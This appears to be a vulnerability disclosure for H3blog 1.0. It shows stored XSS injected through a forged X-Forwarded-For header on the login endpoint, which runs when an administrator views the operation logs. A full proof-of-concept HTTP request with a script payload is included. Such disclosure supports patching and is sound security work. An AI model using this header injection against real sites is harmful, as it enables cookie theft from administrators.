# In H3blog version 1.0, the `/login` endpoint was vulnerable to JavaScript code injection via a forged `X-Forwarded-For` header. An attacker could craft a malicious login request containing harmful JavaScript code. This code would then execute when an administrator views the operation logs, potentially leading to the theft of sensitive information such as cookies.

![img](https://camo.githubusercontent.com/5542915ba62275659a23369ffd9486fba9cd69622b39d6725cbca22e7ed0ac64/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f32353438303132372f313735363836353937383430342d38626339386331342d666535622d346230622d613132312d3530343231663132363263352e706e673f782d6f73732d70726f636573733d696d616765253246666f726d617425324377656270)

The backend records user operation logs, which include information such as user login IP addresses. To locate the relevant logging method, inspect the ordinary user login endpoint.

![img](https://camo.githubusercontent.com/1bef2eed01477b10e57ff22f9bbc8bc418a0e6532a7c4bb3d80c3e616ba2240a/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f32353438303132372f313735363836363832383637392d66616535663961382d373665312d343832662d613165662d3234633339356232363566332e706e67)

The `@admin_perm` decorator is used, which includes an `opt_log` method for recording operation logs. Please review the implementation of this method.

![img](https://camo.githubusercontent.com/bcc13d9214d4ba318070e247e540c7242a6003b255e68ddcde9ad7fe8b429448/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f32353438303132372f313735363836363834373039372d34636563386335352d616230612d343633612d616230362d6536646438363062386262312e706e67)

The IP address is recorded here via the `get_real_ip()` method. Please examine the implementation of this method.

![img](https://camo.githubusercontent.com/ca6651c64fff4e09e1ce6572c0d563dfab96f2047e2cd59656358cb04c6510d6/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f32353438303132372f313735363836363835343932382d36333336386262382d373465632d343061612d393666342d6565663437376634313261312e706e67)

The system prioritizes retrieving the IP address from the `X-Forwarded-For` header, which can be spoofed. To exploit this, capture a user login request and inject a forged `X-Forwarded-For` header.

```
POST /login?next=/ HTTP/1.1
Host: 127.0.0.1:5000
Cache-Control: max-age=0
Sec-Fetch-User: ?1
Accept-Encoding: gzip, deflate, br, zstd
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Dest: document
sec-ch-ua-platform: "Windows"
Cookie: session=eyJjc3JmX3Rva2VuIjoiOGU0ZWM0YzU5MmEzOTgwODY3ZDEwYjM4YjI4ZDVmZjMyYTBjOWYzYSJ9.aLelCA.I7bg3GyF1UzV8rGcv9Xc64S4QPo
sec-ch-ua: "Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"
Content-Type: application/x-www-form-urlencoded
Origin: http://127.0.0.1:5000
sec-ch-ua-mobile: ?0
Referer: http://127.0.0.1:5000/
X-Forwarded-For: <script>alert('XSS');</script>
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Upgrade-Insecure-Requests: 1
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 136

csrf_token=IjhlNGVjNGM1OTJhMzk4MDg2N2QxMGIzOGIyOGQ1ZmYzMmEwYzlmM2Ei.aLelCA.WPl8KTPiPPt4bx4RZHCmxLrh79M&username=caigosec&password=123456
```

![img](https://camo.githubusercontent.com/cc8faef0223ba66f3bb7bfe39f589cf8f155334b793d72c3063ac54a27a337c7/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f32353438303132372f313735363836363730373139352d33643861386561642d616532612d343033312d393461612d3630333132356136353961362e706e67)

Simulate an administrator viewing the operation logs.

![img](https://camo.githubusercontent.com/da89c94d91b901cf088ebed359737b8eb5126281a19f12244709f5b22817b584/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f32353438303132372f313735363836363735353832382d30373537666361372d303638322d343931382d396530652d3333376534366564353832662e706e67)

The malicious code is executed successfully.